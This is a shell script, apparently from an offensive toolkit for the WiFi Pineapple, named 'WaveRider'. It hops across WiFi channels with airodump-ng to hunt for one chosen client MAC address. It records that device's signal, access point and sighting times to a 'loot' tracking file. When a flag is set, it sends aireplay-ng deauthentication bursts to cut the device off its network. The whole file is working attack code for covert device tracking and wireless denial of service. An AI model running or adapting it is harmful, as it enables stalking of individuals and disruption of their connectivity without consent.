#!/bin/sh
#####################################################
# NullSec WaveRider Payload
# Channel-hopping pursuit - follows target across channels
#####################################################
# Author: NullSec Team
# Target: WiFi Pineapple Pager
# Category: Tracking/Pursuit
#####################################################

PAYLOAD_NAME="WaveRider"
source /root/payloads/library/nullsec-lib.sh 2>/dev/null || true

# Target from recon or manual
TARGET_MAC="${TARGET_CLIENT_MAC:-$1}"
MONITOR_INTERFACE="wlan1mon"
LOOT_DIR="/root/loot/waverider"
LOG_FILE="$LOOT_DIR/pursuit_$(date +%Y%m%d_%H%M%S).log"
ATTACK_ON_FIND="${2:-false}"  # Deauth when found

mkdir -p "$LOOT_DIR"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "[!] Stopping pursuit..."
    killall airodump-ng 2>/dev/null
    airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null
    exit 0
}

trap cleanup INT TERM

if [ -z "$TARGET_MAC" ]; then
    echo "Usage: $0 <target_mac> [attack_on_find]"
    echo "Example: $0 AA:BB:CC:DD:EE:FF true"
    exit 1
fi

log "=========================================="
log "   NullSec WaveRider v1.0"
log "=========================================="
log "[*] Target: $TARGET_MAC"
log "[*] Attack on find: $ATTACK_ON_FIND"

# Setup monitor mode
log "[*] Enabling monitor mode..."
airmon-ng start wlan1 2>/dev/null

LAST_CHANNEL=0
FOUND_COUNT=0

log "[*] Beginning channel sweep pursuit..."

while true; do
    for CHANNEL in 1 2 3 4 5 6 7 8 9 10 11 12 13; do
        # Set channel
        iwconfig "$MONITOR_INTERFACE" channel "$CHANNEL" 2>/dev/null
        
        # Quick scan on this channel
        timeout 2 airodump-ng "$MONITOR_INTERFACE" -c "$CHANNEL" --write /tmp/wave --output-format csv 2>/dev/null &
        sleep 2
        killall airodump-ng 2>/dev/null
        
        # Check if target found
        if grep -qi "$TARGET_MAC" /tmp/wave-01.csv 2>/dev/null; then
            FOUND_COUNT=$((FOUND_COUNT + 1))
            
            # Get associated AP
            ASSOC_AP=$(grep -i "$TARGET_MAC" /tmp/wave-01.csv 2>/dev/null | cut -d',' -f6 | tr -d ' ')
            SIGNAL=$(grep -i "$TARGET_MAC" /tmp/wave-01.csv 2>/dev/null | cut -d',' -f4 | tr -d ' ')
            
            log "[+] TARGET FOUND! Channel: $CHANNEL | Signal: ${SIGNAL}dBm"
            log "[+] Associated to: $ASSOC_AP"
            log "[*] Total sightings: $FOUND_COUNT"
            
            # Record location data
            echo "$CHANNEL,$SIGNAL,$ASSOC_AP,$(date)" >> "$LOOT_DIR/target_track.csv"
            
            if [ "$ATTACK_ON_FIND" = "true" ]; then
                log "[!] ATTACKING - Sending deauth burst..."
                aireplay-ng -0 10 -a "$ASSOC_AP" -c "$TARGET_MAC" "$MONITOR_INTERFACE" 2>/dev/null &
                sleep 3
                killall aireplay-ng 2>/dev/null
            fi
            
            # Stay on this channel longer
            LAST_CHANNEL=$CHANNEL
            sleep 5
        fi
        
        rm -f /tmp/wave*.csv 2>/dev/null
    done
    
    log "[*] Completed sweep cycle, continuing pursuit..."
done
